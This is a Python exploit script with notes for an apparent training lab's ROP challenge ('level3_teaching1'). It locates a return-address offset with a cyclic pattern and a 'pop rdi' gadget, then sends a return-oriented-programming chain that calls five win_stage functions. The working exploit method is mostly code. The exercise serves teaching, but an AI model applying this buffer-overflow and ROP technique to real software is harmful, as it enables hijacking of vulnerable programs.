"""
check pwn with: pwn checksec <bin_file_name>

Terminal 1:
import pwn
io = pwn.process("level3_teaching1")
#TODO: get <pid>

Terminal 2: 
gdb -p <pid>
p win_stage_1 #prints address of win_stage_1 function
p win_stage_2 #prints address of win_stage_2 function
p win_stage_3 #prints address of win_stage_3 function
p win_stage_4 #prints address of win_stage_4 function
p win_stage_5 #prints address of win_stage_5 function
c

Terminal 1:
io.send(pwn.cyclic(1000, n=8))

Terminal 2: 
#TODO: get return addr <retq>

Terminal 1: 
pwn.cyclic_find(<retq>, n=8) #prints starting position of return address

In any new terminal, run:
rp++ --unique -r2 -f level3_teaching1 | grep "pop rdi"
#TODO: get gadget addr

Run script below. Note where the numbers are from.
"""

import pwn

dis = 56
win_stage_1 = 0x401d20
win_stage_2 = 0x401c83
win_stage_3 = 0x401b49
win_stage_4 = 0x401be6
win_stage_5 = 0x401dbd
gadget = 0x00402083

x = b"a"*dis + pwn.p64(gadget) + pwn.p64(0x1) + pwn.p64(win_stage_1) + pwn.p64(gadget) + pwn.p64(0x2) + pwn.p64(win_stage_2) + pwn.p64(gadget) + pwn.p64(0x3) + pwn.p64(win_stage_3) + pwn.p64(gadget) + pwn.p64(0x4) + pwn.p64(win_stage_4) + pwn.p64(gadget) + pwn.p64(0x5) + pwn.p64(win_stage_5)

io = pwn.process("/challenges/rop/level3_teaching1")
io.send(x)

print(io.readall().decode('latin-1'))